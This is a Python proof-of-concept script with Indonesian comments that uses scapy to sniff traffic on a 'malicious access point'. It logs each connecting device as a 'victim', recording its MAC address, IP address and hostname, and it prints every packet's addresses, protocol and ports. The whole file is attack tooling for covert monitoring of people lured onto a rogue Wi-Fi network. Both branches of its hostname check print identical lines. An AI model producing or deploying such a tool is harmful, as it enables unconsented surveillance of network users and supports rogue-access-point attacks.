# Akses Poin Berbahaya
# Proof of Concept
# Juki Gladak @2024

from scapy.all import *
import datetime
import socket

# Tentukan Wifi Interface yang digunakan
INTERFACE = "Wi-Fi 3"

# Simpan Mac Address dari perangkat yang terkoneksi
connected_devices = set()

# Fungsi untuk mencoba mendapatkan hostname dari perangkat yang tekoneksi
def get_hostname(ip):
    """Coba dapatkan hostname dari IP Address yang didapatkan"""
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        return hostname
    except socket.herror:
        return None
    
# Fungsi untuk menampilkan log ketika perangkat join ke wifi racun 
def log_new_connection(mac, ip):
    """Tampilkan log setiap device yang join"""
    hostname = get_hostname(ip) # Percobaan resolve
    if hostname:
        print(f"[{datetime.datetime.now()}] Ada korban terkoneksi: MAC={mac}, IP={ip}, Hostname={hostname}")
    else:
        print(f"[{datetime.datetime.now()}] Ada korban terkoneksi: MAC={mac}, IP={ip}, Hostname={hostname}")

# Fungsi untuk memeriksa paket
def packet_callback(packet):
    """Fungsi untuk memproses setiap paket"""
    global connected_devices

    # Periksa paket paket ARP (Perangkat yang meminta IP atau balasan permintaan IP)
    if ARP in packet and packet[ARP].op in (1,2): # Request ARP dan balasan
        mac = packet[ARP].hwsrc # Mac Address pengirim
        ip = packet[ARP].psrc # IP Address pengirim

        if mac not in connected_devices:
            connected_devices.add(mac)
            log_new_connection(mac, ip)
    
    # Periksa apakah paket memiliki layer IP
    if IP in packet:
        src_ip = packet[IP].src # IP Sumber 
        dst_ip = packet[IP].dst # IP Tujuan
        protocol = packet[IP].proto # Protokol yang digunakan

        #Print informasi paket
        print(f"[{datetime.datetime.now()}] {src_ip} -> {dst_ip} (Protocol: {protocol})")

        # Analisis tambahan untuk TCP/UDP 
        if TCP in packet:
            print(f"TCP Port: {packet[TCP].sport} -> {packet[TCP].dport}")
        elif UDP in packet:
            print(f"UDP Port: {packet[UDP].sport} -> {packet[UDP].dport}")

# Ayo kita jalankan program sniffing ini
print(f"Memulai pengindraan perangkat yang konek ke Wifi AP racun kita melalui interface: {INTERFACE}")
sniff(iface=INTERFACE, prn=packet_callback, store=0)
